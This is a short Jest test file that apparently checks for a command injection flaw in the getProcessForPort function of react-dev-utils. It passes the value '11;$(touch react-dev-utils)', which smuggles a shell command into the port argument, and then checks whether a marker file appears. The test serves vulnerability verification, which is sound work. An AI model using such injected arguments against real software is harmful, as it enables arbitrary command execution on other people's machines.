//https://github.com/facebook/create-react-app/pull/10644
test("Command Injection in react-dev-utils", () => {
  const getProcessForPort = require("react-dev-utils/getProcessForPort");
  const fs = require("fs");
  const path = "./react-dev-utils";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  getProcessForPort("11;$(touch react-dev-utils)");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
